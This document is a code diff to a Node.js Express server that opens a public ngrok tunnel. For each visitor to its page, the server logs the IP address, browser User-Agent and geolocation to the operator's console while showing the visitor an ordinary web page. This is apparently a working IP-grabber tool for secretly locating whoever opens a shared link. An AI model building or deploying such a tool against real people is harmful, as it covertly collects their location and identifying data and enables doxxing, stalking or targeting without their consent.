@@ -1,48 +1,51 @@
+// Imports
 const geoip = require('geoip-lite');
 const express = require('express');
+const ngrok = require('ngrok');
 const path = require('path');
 const app = express()
 const port = 8080
 
+
+// Your ngrok auth token (Get it here: https://dashboard.ngrok.com/get-started/your-authtoken)
+const token = 'PUT YOUR AUTH TOKEN HERE'
+
+
 // Terminal Color Variables
-const Reset = "\x1b[0m"
-const Bold = "\x1b[1m"
-const Dim = "\x1b[2m"
-const Underline = "\x1b[4m"
-const FgGreen = "\x1b[32m"
-const FgMagenta = "\x1b[35m"
-const FgCyan = "\x1b[36m"
+const Reset = '\x1b[0m'
+const Bold = '\x1b[1m'
+const Dim = '\x1b[2m'
+const Underline = '\x1b[4m'
+const FgGreen = '\x1b[32m'
+const FgMagenta = '\x1b[35m'
+const FgCyan = '\x1b[36m'
 
 // Main Server Function
 function startServer() {
-    // App Headers Handler
-    app.use((req, res, next) => {
-        req.header('Bypass-Tunnel-Reminder', 'True')
-        res.append('Bypass-Tunnel-Reminder', 'True')
-        next()
-    });
+    // Creating Ngrok Tunnel
+    (async function() {
+        const url = await ngrok.connect({authtoken: token, addr: 8080})
+        console.log(Bold + FgMagenta + 'Your url: ' + Reset, url)
+    })();
 
     // App Request Handler
     app.get('/', (req, res) => {
-        // Handle Request Header
-        req.headers['Bypass-Tunnel-Reminder'] = 'True'
-
         // Declare User Request Variables
         var userAgent = req.get('User-Agent')
         var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        if (ip.substr(0, 7) == "::ffff:") {
+        if (ip.substr(0, 7) == '::ffff:') {
             ip = ip.substr(7)
         }
         var geo = geoip.lookup(ip);
 
         // Server Side Responses (Admin Feedback)
         console.log(Bold + FgCyan + '\nNew Request Received ✔️\n' + Reset)
-        console.log(FgGreen + 'IP:' + Reset, Underline + ip + Reset)
+        console.log(FgGreen + 'IP: ' + Reset, Underline + ip + Reset)
         console.log(FgGreen + 'User-Agent: ' + Reset, userAgent)
         console.log(FgGreen + 'Geo: ' + Reset, JSON.stringify(geo, null, 2) + '\n')
 
         //Client Side Responses (Client View)
-        res.sendFile(path.join(__dirname, 'public/index.html'));
+        res.sendFile(path.join(__dirname, 'public/index.html'))
     })
 
     // App Listener
